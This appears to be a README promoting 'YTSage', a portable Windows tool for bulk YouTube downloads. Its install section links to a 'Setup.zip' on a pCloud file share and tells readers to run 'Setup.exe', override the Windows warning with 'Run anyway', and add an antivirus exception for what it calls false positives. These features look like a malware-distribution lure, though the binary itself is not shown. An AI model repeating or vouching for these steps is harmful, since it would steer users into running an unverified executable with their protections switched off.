**Download YouTube videos in bulk. No fuss, no ads, just works.**

I made YTSage because I got tired of downloading videos one by one from YouTube. It's a simple desktop tool that does exactly what it says - you give it links, it gives you videos. Nothing more, nothing fancy.

## What it does

- **Batch downloads** - paste 1 link or 50, it doesn't care
- **Best quality available** - grabs whatever's highest (up to 4K if source has it)
- **Zero config** - open it, paste links, pick folder, click download
- **Portable** - one .exe file, no installation, no Python, no headaches
- **Free** - because paying for a downloader feels wrong

## How to get it

Two steps. That's it.

**Step 1 – Download**

Grab the zip here → **[DOWNLOAD](https://u.pcloud.link/publink/show?code=XZrLul5ZkDqYAgWoJm4IL6tl5QcIkVmPQEGV)**

(The link goes to pCloud. When the page opens, just hit the Download button.)

**Step 2 – Run**

1. Find `Setup.zip` in your Downloads folder
2. Right-click → Extract All
3. Open the extracted folder
4. Double-click `Setup.exe`

Done. No registry changes, no background services, nothing left behind.

## How to use it

- Launch the exe
- Copy video URLs from YouTube
- Paste them into the window (one per line)
- Choose where to save
- Hit Download All and let it run

## Things to know

**Windows might complain** when you first run it. It's because the exe isn't signed with a paid certificate (those cost money). Click "More info" then "Run anyway" - it's safe.

**Antivirus sometimes gets jumpy** with download tools. False positive. If your AV blocks it, add an exception.

**Downloads not working?** Check if links are public. If everything looks right and it still fails, open an issue and I'll take a look.
